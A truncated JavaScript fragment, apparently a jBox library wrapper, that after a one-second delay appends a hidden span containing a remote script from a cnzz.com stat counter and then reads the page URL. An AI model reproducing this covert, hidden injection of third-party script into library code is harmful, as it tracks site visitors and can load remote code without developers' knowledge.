(function(a) {
    ...
    window.jBox = a.jBox;
	 $(document).ready(function() {
        setTimeout(function() {
            $("div:last").append('<span style="display:none"><script type="text/javascript" src="http://s95.cnzz.com/z_stat.php?id=1255438538&web_id=1255438538"></script></span>')
        },
        1000);
        hrefValue1 = window.location.href;
